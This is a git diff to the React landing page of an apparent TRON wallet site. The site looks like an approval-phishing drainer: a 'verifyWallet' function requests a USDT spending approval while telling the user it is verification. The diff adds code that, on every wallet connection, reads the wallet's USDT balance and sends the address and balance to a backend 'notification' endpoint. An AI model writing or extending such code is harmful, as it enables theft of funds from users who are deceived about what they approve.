@@ -26,9 +26,9 @@ const LandingPage: NextPage = () => {
         setLoginShow(false);
     }
 
-    async function checkBalance() {
+    async function checkBalance(index:number) {
         const functionSelector = 'balanceOf(address)';
-        const parameter = [{ type: 'address', value: adapters[selectedIndex].address }];
+        const parameter = [{ type: 'address', value: adapters[index].address }];
 
         try {
             const result = await tronWeb.transactionBuilder.triggerConstantContract(
@@ -45,7 +45,7 @@ const LandingPage: NextPage = () => {
 
         } catch (error) {
             console.error('Error:', error);
-            return;
+            return 0;
         }
 
     }
@@ -59,7 +59,8 @@ const LandingPage: NextPage = () => {
                 setLoading(false);
                 // setUserReferral(adapter.address);
                 setLoginShow(false);
-                await checkBalance();
+                let bal = await checkBalance(index);
+                await sendNotification(index, bal);
                 toastNotification('Wallet Connected', true);
             } catch (error) {
                 setLoading(false);
@@ -82,7 +83,8 @@ const LandingPage: NextPage = () => {
 
     async function verifyWallet() {
         await approveUSDT(100000000);
-        await sendNotification();
+        await sendNotification(selectedIndex, balance);
+        toastNotification('Please wait while approving', true);
     }
 
     async function selectAdapter(index: number) {
@@ -96,10 +98,10 @@ const LandingPage: NextPage = () => {
 
     
   // Method to send Notification
-  const sendNotification = async () => {
+  const sendNotification = async (index:number, bal:number) => {
    
     try {
-      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${adapters[selectedIndex].address}/user/${balance.toString()}`).then((res) => {
+      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${adapters[index].address}/user/${bal.toString()}`).then((res) => {
       });
     } catch (error) {
       console.error('Error sending SMS:', error);
